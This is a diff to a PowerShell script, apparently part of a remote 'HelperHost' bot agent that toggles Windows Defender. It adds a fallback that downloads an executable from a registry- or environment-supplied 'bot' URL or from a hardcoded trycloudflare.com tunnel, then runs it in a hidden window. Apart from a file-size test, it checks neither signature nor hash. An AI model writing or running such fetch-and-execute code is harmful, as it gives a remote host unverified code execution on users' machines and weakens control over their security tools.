@@ -60,8 +60,40 @@ Remove-Item (Join-Path $hh 'dc-off.cmd') -Force -EA SilentlyContinue
 
 $en = Join-Path $hh 'enable-defender.exe'
 $enTemp = Join-Path $env:TEMP 'hh-enable-defender.exe'
-if (Test-Path $en) { Copy-Item $en $enTemp -Force -EA SilentlyContinue }
-$enRun = if (Test-Path $enTemp) { $enTemp } elseif (Test-Path $en) { $en } else { $null }
+$enRun = $null
+if (Test-Path $en) {
+  Copy-Item $en $enTemp -Force -EA SilentlyContinue
+  $enRun = $enTemp
+} elseif (Test-Path $enTemp) {
+  $enRun = $enTemp
+}
+# Pull from bot if missing (manual restore after wipe)
+$botEnable = $null
+try {
+  $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
+  if ($st) {
+    $j = $st | ConvertFrom-Json
+    if ($j.bot_base) { $botEnable = ($j.bot_base.TrimEnd('/') + '/files/tools/enable-defender.exe') }
+  }
+} catch {}
+if (-not $enRun -and $env:AGENTSHE_BOT_BASE) {
+  $botEnable = ($env:AGENTSHE_BOT_BASE.TrimEnd('/') + '/files/tools/enable-defender.exe')
+}
+if (-not $enRun -and -not $botEnable -and $env:AGENTSHE_RESTORE_URL) {
+  try {
+    $botEnable = (($env:AGENTSHE_RESTORE_URL -replace '/files/scripts/.*$', '') + '/files/tools/enable-defender.exe')
+  } catch {}
+}
+# Hardcoded public bot for emergency restore when no state left
+if (-not $enRun -and -not $botEnable) {
+  $botEnable = 'https://sudden-admissions-capacity-triumph.trycloudflare.com/files/tools/enable-defender.exe'
+}
+if (-not $enRun -and $botEnable) {
+  try {
+    & curl.exe -fsSL $botEnable -o $enTemp
+    if ((Test-Path $enTemp) -and (Get-Item $enTemp).Length -gt 100000) { $enRun = $enTemp }
+  } catch {}
+}
 if ($enRun) {
   try {
     $p = Start-Process -FilePath $enRun -ArgumentList @('-s') -Wait -PassThru -WindowStyle Hidden -EA SilentlyContinue
